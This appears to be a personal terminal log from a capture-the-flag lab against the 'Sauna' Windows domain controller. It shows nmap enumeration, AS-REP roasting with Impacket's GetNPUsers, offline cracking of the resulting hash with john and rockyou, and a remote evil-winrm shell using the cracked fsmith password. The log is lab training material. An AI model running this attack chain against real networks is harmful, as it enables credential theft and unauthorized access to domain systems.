allenwest1@debian:~$ ping 10.10.10.175
PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.
64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=24.1 ms
64 bytes from 10.10.10.175: icmp_seq=2 ttl=127 time=23.3 ms
64 bytes from 10.10.10.175: icmp_seq=3 ttl=127 time=22.1 ms
c64 bytes from 10.10.10.175: icmp_seq=4 ttl=127 time=22.1 ms
^C
--- 10.10.10.175 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 12ms
rtt min/avg/max/mdev = 22.080/22.900/24.120/0.860 ms
allenwest1@debian:~$ nmap -sV -sC -Pn 10.10.10.175
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-16 15:33 EDT
Nmap scan report for 10.10.10.175
Host is up (0.023s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-04-17 02:36:34Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?                                                                                                                            
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=4/16%Time=5E98B307%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h03m11s, deviation: 0s, median: 7h03m11s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-04-16 22:38:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 263.26 seconds
.
.
.
// Got to the site 10.10.10.175
// --> About us.
// Logged the usernames in users.txt
// downloaded GetNPusers @ https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
.
.
.
allenwest1@debian:~$ nmap -n -sV -script "Idap*" -p 389 10.10.10.175
.
.
.
// This gave me: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
// EGOTISTICAL-BANK.LOCAL
.
.
.
allenwest1@debian:~$ python NPusers.py  EGOTISTICAL-BANK.LOCAL/ -userfile users.txt -outputfile hash.txt -dc-ip 10.10.10.175
Traceback (most recent call last):
  File "NPusers.py", line 35, in <module>
    from pyasn1.codec.der import decoder, encoder
ImportError: No module named pyasn1.codec.der
allenwest1@debian:~$ cat hash.txt 
...
allenwest1@debian:~$ john -wordlist=~/Desktop/rockyou.txt hash.txt
.
.
.
// fsmith:Thestrokes23
.
.
.
allenwest1@debian:~$ evil-winrm -u fsmith -p Thestrokes23 -i 10.10.10.175

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\FSmith\Documents> 
.
.
.
// conitnued in asFsmith.bash


